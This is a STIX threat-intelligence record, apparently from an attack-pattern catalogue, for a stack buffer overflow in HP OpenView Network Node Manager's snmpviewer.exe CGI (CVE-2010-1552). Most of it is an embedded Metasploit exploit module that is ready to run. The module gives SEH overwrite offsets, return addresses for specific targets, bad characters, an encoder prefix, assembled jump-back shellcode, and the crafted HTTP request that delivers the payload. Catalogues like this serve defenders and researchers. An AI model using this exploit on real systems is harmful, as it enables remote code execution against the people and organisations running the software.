{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--dc8149d8-90ba-438c-b312-c952a428637f",
    "created": "2024-08-14T16:51:44.236335Z",
    "modified": "2024-08-14T16:51:44.23634Z",
    "name": "HP OpenView Network Node Manager snmpviewer.exe Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.53 prior to NNM_01203. By making a specially crafted HTTP request to the \"snmpviewer.exe\" CGI program, an attacker can cause a stack-based buffer overflow and execute arbitrary code.  The vulnerable code lies within a function within \"snmpviewer.exe\" with a timestamp prior to April 7th, 2010. This vulnerability is triggerable via either a GET or POST request. The request must contain 'act' and 'app' parameters which, when combined, total more than the 1024 byte stack buffer can hold.  It is important to note that this vulnerability must be exploited by overwriting SEH. While the saved return address can be smashed, a function call that occurs before the function returns calls \"exit\". } ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/hp_nnm_snmpviewer_actapp.rb",
            "external_id": "hp_nnm_snmpviewer_actapp.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-1552"
        },
        {
            "source_name": "reference",
            "url": "http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02153379"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  HttpFingerPrint = { :method => 'HEAD', :uri => '/OvCgi/snmpviewer.exe', :pattern => /Hewlett-Packard Development Company/ }\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'HP OpenView Network Node Manager snmpviewer.exe Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.53\n        prior to NNM_01203. By making a specially crafted HTTP request to the \"snmpviewer.exe\"\n        CGI program, an attacker can cause a stack-based buffer overflow and execute arbitrary\n        code.\n\n        The vulnerable code lies within a function within \"snmpviewer.exe\" with a\n        timestamp prior to April 7th, 2010. This vulnerability is triggerable via either a GET\n        or POST request. The request must contain 'act' and 'app' parameters which, when\n        combined, total more than the 1024 byte stack buffer can hold.\n\n        It is important to note that this vulnerability must be exploited by overwriting SEH.\n        While the saved return address can be smashed, a function call that occurs before\n        the function returns calls \"exit\".\n      } ,\n      'Author'         =>\n        [\n          'jduck'   # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2010-1552' ],\n          [ 'OSVDB', '64975' ],\n          [ 'BID', '40068' ],\n          [ 'ZDI', '10-083' ],\n          [ 'URL', 'http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02153379' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'Space'    => 1024, # 1024 byte buffer..\n          'BadChars' =>\n            # Not sure why this one has a different set of bad chars...\n            (\n              (0x00..0x08).to_a + (0x0b..0x1f).to_a +\n              [ 0x21, 0x26, 0x3c, 0x3e, 0x5b, 0x5d, 0x5e, 0x60, 0x7e, 0x7f ]\n            ).pack('C*'),\n          'DisableNops' => true,\n          # Manually use FPU to get EIP into ECX\n          'PrependEncoder' => \"\\x89\\xe2\\xdb\\xdb\\xd9\\x72\\xf4\\x59\\x83\\xe9\\xf7\",\n          'EncoderOptions' => { 'BufferRegister' => 'ecx' },\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'HP OpenView Network Node Manager 7.53 w/NNM_01201',\n            {\n              'Ret'     => 0x5a238ba7, # pop edx/pop ebp/ret - in ovsnmp.dll v1.30.10.9166\n            }\n          ],\n          [ 'HP OpenView Network Node Manager 7.53 (Windows 2003)',\n            {\n              'Ret'     => 0x71c069dd, # pop edx/pop ecx/ret - in ws2_32.dll v5.2.3790.3959\n            }\n          ],\n          [ 'Debug Target',\n            {\n              'Ret'     => 0xdeadbeef, # crasher\n            }\n          ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2010-05-11'))\n  end\n\n  def exploit\n\n    print_status(\"Trying target #{target.name}...\")\n\n    cgi = '/OvCgi/snmpviewer.exe'\n\n    # \"ins\" must be \"load\" or \"content\"\n    ins_ok = [ 'load', 'content' ]\n    ins = ins_ok[rand(ins_ok.length)]\n\n    start = 'The specified Application/Action name is not defined.<p>Application:\"'\n    #middle = '\"<p>Action:\"'\n\n    ia32 = Metasm::Ia32.new\n\n    # SEH\n    seh_offset = 1192\n    seh_frame = rand_text(8)\n\n    # Jump back to the payload, after p/p/r jumps to us.\n    distance = seh_offset - start.length + seh_frame.length # dry run\n    jmp_back = Metasm::Shellcode.assemble(ia32, \"jmp $-\" + distance.to_s).encode_string\n    distance = seh_offset - start.length - jmp_back.length\n    distance += 8 if ins == 'content'\n    jmp_back = Metasm::Shellcode.assemble(ia32, \"jmp $-\" + distance.to_s).encode_string\n\n    # A short jump back to the long jump back :)\n    jmp_small = Metasm::Shellcode.assemble(ia32, \"jmp $-\" + jmp_back.length.to_s).encode_string\n\n    # Fix up the SEH frame\n    seh_frame[0,jmp_small.length] = jmp_small\n    seh_frame[4,4] = [target.ret].pack('V')\n\n    # Create the buffer\n    buf = ''\n    buf << payload.encoded\n    pad = seh_offset - start.length - buf.length - jmp_back.length\n    pad += 8 if ins == 'content'\n    buf << rand_text(pad)\n    buf << jmp_back\n    buf << seh_frame\n\n    app = buf\n\n    # Force an exception writing off the end of the stack\n    action = rand_text(1024)\n\n    # Send the request\n    if rand(2) > 0\n      print_status(\"Sending exploit via POST request (ins=#{ins})...\")\n      res = send_request_cgi({\n        'uri'\t\t  => cgi,\n        'method'\t  => \"POST\",\n        'vars_post' =>\n          {\n            'ins' => ins,\n            'act' => action,\n            'app' => app\n          }\n      }, 3)\n    else\n      print_status(\"Sending exploit via GET request (ins=#{ins})...\")\n      res = send_request_cgi({\n        'uri'\t\t  => cgi,\n        'method'\t  => \"GET\",\n        'vars_get' =>\n          {\n            'ins' => ins,\n            'act' => action,\n            'app' => app\n          }\n      }, 3)\n    end\n\n    if res and res.code != 502\n      print_error(\"Eek! We weren't expecting a response, but we got one\")\n      print_status(res.to_s) if datastore['NNM_DEBUG']\n    end\n\n    handler\n\n  end\n\n  def wfs_delay\n    5\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-05-11",
    "x_mitre_platforms": [
        "win'"
    ]
}